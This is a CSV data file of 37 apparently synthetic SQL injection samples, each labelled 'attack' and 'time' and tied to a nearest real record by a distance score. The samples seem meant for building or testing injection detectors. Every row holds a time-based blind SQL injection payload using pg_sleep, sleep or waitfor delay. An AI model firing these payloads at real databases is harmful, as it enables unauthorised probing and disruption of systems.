id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.849958798500863
CTGAN_000002,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.519512124888828
CTGAN_000003,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.170475007940934
CTGAN_000004,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.044224677078205
CTGAN_000005,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.6049430951288866
CTGAN_000006,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.052804505520917
CTGAN_000007,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.885957811042752
CTGAN_000008,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,7.0249578835148245
CTGAN_000009,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.016870165987728
CTGAN_000010,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.1886795891221515
CTGAN_000011,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.987604776887354
CTGAN_000012,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.4480752992367805
CTGAN_000013,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.6780387110525945
CTGAN_000014,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.729357361744582
CTGAN_000015,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.52709252581707
CTGAN_000016,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.583167244662483
CTGAN_000017,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.606071154116788
CTGAN_000018,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.174894626991073
CTGAN_000019,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.6540265695479635
CTGAN_000020,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.453448769678695
CTGAN_000021,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.4687816969250855
CTGAN_000022,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.979768410349519
CTGAN_000023,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,5.843271023380234
CTGAN_000024,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.612589635719784
CTGAN_000025,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.403549020303264
CTGAN_000026,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.26654081986263
CTGAN_000027,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.565421941201597
CTGAN_000028,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.528140115336296
CTGAN_000029,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.33482864350612
CTGAN_000030,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.159798462377568
CTGAN_000031,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,4.935914384304916
CTGAN_000032,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.94647759832623
CTGAN_000033,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.522756537567481
CTGAN_000034,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.649319045162702
CTGAN_000035,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.1584596823749065
CTGAN_000036,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.772459140871266
CTGAN_000037,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,7.6521842140707355
